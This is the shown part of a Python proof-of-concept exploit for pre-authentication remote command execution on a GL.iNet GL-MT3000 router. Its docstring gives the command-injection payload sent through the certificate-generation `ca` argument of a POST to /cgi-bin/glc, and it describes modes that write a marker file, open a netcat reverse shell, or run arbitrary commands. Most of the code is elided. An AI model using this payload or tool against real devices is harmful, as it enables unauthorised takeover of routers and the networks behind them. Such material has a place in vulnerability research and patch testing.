#!/usr/bin/env python3
"""
GL.iNet GL-MT3000 4.4.5 `ovpn-server.generate_certificate(ca)` pre-auth RCE PoC

This script is the CA-parameter-only split of the original combined
`ovpn-server.generate_certificate` PoC.  It always injects through `args.ca`:

    POST /cgi-bin/glc
    {"object":"ovpn-server","method":"generate_certificate","args":{"ca":"x; <cmd>; #"}}

Modes:
  - marker: write `/www/OVPN_CA_RCE_<timestamp>.txt` and poll it over HTTP.
  - reverse-shell: send a netcat FIFO reverse shell and run a small probe.
  - --cmd: execute a custom shell command through the CA sink.
"""
...
def main():
    ap = argparse.ArgumentParser(description="GL.iNet MT3000 ovpn-server.generate_certificate(ca) pre-auth RCE PoC")
